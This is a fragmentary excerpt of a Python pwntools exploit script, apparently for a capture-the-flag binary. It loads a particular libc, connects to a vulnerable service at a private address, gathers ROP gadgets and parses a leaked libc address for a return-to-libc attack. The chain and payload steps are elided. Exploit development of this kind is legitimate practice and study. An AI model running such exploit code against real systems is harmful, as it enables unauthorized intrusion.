...
LIBC = ELF("libc6_2.27-3ubuntu1.4_amd64.so") #ELF("/lib/x86_64-linux-gnu/libc.so.6") #Set library path when know it
...
if LOCAL:
    ...
    P = remote('192.168.120.11',36423) # start the vuln binary
    ELF_LOADED = ELF(LOCAL_BIN)# Extract data from binary
    ROP_LOADED = ROP(ELF_LOADED)# Find ROP gadgets
...
def get_addr(libc_func):
    ...
    if b"lol i don't have no money to buy this kind of shit bro." in recieved:
        recieved = P.recvline().strip()
    recieved = P.recvline().strip()
    print(recieved)
